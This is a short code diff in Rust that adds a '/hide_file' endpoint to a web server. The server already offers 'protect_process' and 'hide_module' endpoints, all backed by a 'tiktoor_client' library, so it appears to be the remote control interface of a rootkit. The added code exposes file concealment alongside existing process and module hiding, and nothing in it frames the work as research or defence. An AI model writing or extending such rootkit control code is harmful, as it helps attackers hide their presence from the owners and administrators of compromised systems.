@@ -55,6 +55,17 @@ async fn protect_process(parameter: web::Json<HideProcessParameter>) -> impl Res
     HttpResponse::Ok()
 }
 
+#[derive(Deserialize)]
+struct HideFileParameter {
+    name: CString,
+}
+
+#[post("/hide_file")]
+async fn hide_file(parameter: web::Json<HideFileParameter>) -> impl Responder {
+    tiktoor_client::hide_file(&parameter.name);
+    HttpResponse::Ok()
+}
+
 #[post("/hide_module")]
 async fn hide_module() -> impl Responder {
     tiktoor_client::hide_module();
